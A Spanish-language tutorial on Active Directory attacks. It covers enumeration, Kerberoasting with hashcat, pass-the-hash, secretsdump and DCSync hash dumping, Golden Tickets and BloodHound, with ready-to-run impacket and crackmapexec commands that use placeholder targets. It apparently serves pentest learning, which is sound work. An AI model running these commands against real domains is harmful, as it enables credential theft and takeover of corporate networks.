1. ¿Qué es Active Directory?

Active Directory (AD) es el servicio de directorio de Microsoft que centraliza la gestión de usuarios, computadoras, permisos y políticas en una red corporativa. Es como la "guía telefónica" de la empresa pero mucho más poderosa.

ConceptoDescripción
Domain Controller (DC)El servidor que controla todo el dominio. Contiene la base de datos de AD (NTDS.dit).
DominioUn grupo de recursos (users, PCs, servers) bajo una misma administración. Ej: empresa.local
UsuariosCuentas de personas o servicios. Cada una con permisos específicos.
GruposConjuntos de usuarios con permisos comunes (Domain Admins, IT Support, etc.)
GPO (Group Policy)Políticas que se aplican automáticamente: contraseñas, restricciones, software.
NTDS.ditLa base de datos que contiene TODOS los hashes de contraseñas del dominio. El Santo Grial.

2. Kerberos: cómo funciona la autenticación

Kerberos es el protocolo de autenticación que usa AD. Funciona con "tickets" en lugar de enviar contraseñas por la red.

    1. Usuario ──[contraseña]──▶ KDC (Domain Controller)
       ◀── TGT (Ticket Granting Ticket) ──
    
    2. Usuario ──[TGT + "quiero acceder a FileServer"]──▶ KDC
       ◀── TGS (Ticket de Servicio para FileServer) ──
    
    3. Usuario ──[TGS]──▶ FileServer
       ◀── Acceso concedido ──

Flujo simplificado de Kerberos: TGT → TGS → Acceso al recurso

3. Enumeración de AD

Enumerar AD
# Enumerar usuarios del dominio
$ crackmapexec smb DC_IP -u user -p pass --users
$ enum4linux -a DC_IP

# Enumerar con ldapsearch
$ ldapsearch -x -H ldap://DC_IP -b "dc=empresa,dc=local"

# Enumerar SPNs (para Kerberoasting)
$ impacket-GetUserSPNs empresa.local/user:pass -dc-ip DC_IP

4. Kerberoasting

Kerberoasting explota cuentas de servicio con SPN: solicitas un ticket de servicio (TGS) cifrado con la contraseña del servicio, y luego lo crackeas offline.

Kerberoasting
# Extraer tickets TGS
$ impacket-GetUserSPNs empresa.local/user:pass -dc-ip DC_IP -request

# Crackear el ticket con Hashcat
$ hashcat -m 13100 ticket_hash.txt /usr/share/wordlists/rockyou.txt

5. Pass-the-Hash y Pass-the-Ticket

Pass-the-Hash (PtH): en lugar de crackear un hash NTLM, lo usas directamente para autenticarte. Windows acepta el hash como si fuera la contraseña.

Pass-the-Hash
# Acceder con hash NTLM (sin conocer la contraseña)
$ impacket-psexec empresa.local/admin@DC_IP -hashes :NTLM_HASH
$ crackmapexec smb DC_IP -u admin -H NTLM_HASH

# Extraer hashes con secretsdump
$ impacket-secretsdump empresa.local/admin:pass@DC_IP

6. Golden Ticket y DCSync

Golden Ticket: si obtienes el hash del usuario krbtgt, puedes crear tickets de Kerberos para CUALQUIER usuario, incluyendo Domain Admin. Es el ataque definitivo.

DCSync: simulas ser un Domain Controller y le pides al DC real que te envíe todos los hashes. Requiere privilegios de replicación.

DCSync
# Extraer TODOS los hashes del dominio (DCSync)
$ impacket-secretsdump empresa.local/admin:pass@DC_IP -just-dc

7. BloodHound: mapear rutas de ataque

BloodHound analiza las relaciones de AD y visualiza rutas de ataque posibles en un grafo. Te muestra cómo escalar desde un usuario normal hasta Domain Admin.

BloodHound

$ bloodhound-python -u user -p pass -d empresa.local -c All -ns DC_IP

# Iniciar BloodHound
$ sudo neo4j start
